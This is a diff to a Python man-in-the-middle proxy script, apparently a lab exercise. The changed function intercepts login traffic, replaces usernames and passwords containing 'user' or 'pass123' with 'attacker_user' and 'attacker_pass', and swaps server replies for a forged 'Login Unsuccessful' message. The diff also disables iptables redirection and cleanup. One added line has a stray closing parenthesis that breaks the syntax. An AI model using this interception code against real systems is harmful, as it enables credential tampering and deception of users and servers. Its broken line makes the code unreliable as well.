@@ -94,17 +94,21 @@ def modify_text_messages(buffer, is_request):
     
     if is_request:
         # Modify the username or password input
-        if "username" in data.lower():
-            data = data.replace("username", "attacker_user")
-        elif "password" in data.lower():
-            data = data.replace("password", "attacker_pass")
+        if "user" in data.lower():
+            #data = data.replace("username", "attacker_user")
+            og_data = data
+            data = "attacker_user"
+        elif "pass123" in data.lower():
+            #data = data.replace("password", "attacker_pass")
+            og_data = data
+            data = "attacker_pass"
 
-        print(f"\n[DEBUG] Original data: {data}")
+        print(f"\n[DEBUG] Original data: {og_data} modefied to [==>] {data}")
     else:
         # Modify server responses
-        data = data.replace("Login Page", "Secure Login Page")
-        data = data.replace("Enter password:", "Enter your secret password:")
-        print(f"\n[DEBUG] Original data: {data}")
+        data = "Login Unsuccessful! for user Wrong Passward.")
+        #data = data.replace("Enter password:", "Enter your secret password:")
+        print(f"\n[DEBUG] Original data: Login successful modefied to [==>] Login Unsuccessful")
     
     return data.encode('utf-8')
 
@@ -228,13 +232,13 @@ def main():
         receive_first = False
     
     # Add the iptables rule on start
-    add_iptables_rule(remote_port, local_port)
+    #add_iptables_rule(remote_port, local_port)
     
     # Start the proxy (your existing server loop here)
     server_loop(local_host, local_port, remote_host, remote_port, receive_first)
 
     # Ensure iptables rule is removed when proxy stops
-    signal.signal(signal.SIGINT, signal_handler("0", "0", remote_port, local_port))  # Capture CTRL+C
+    #signal.signal(signal.SIGINT, signal_handler("0", "0", remote_port, local_port))  # Capture CTRL+C
 
 if __name__ == '__main__':
     main()
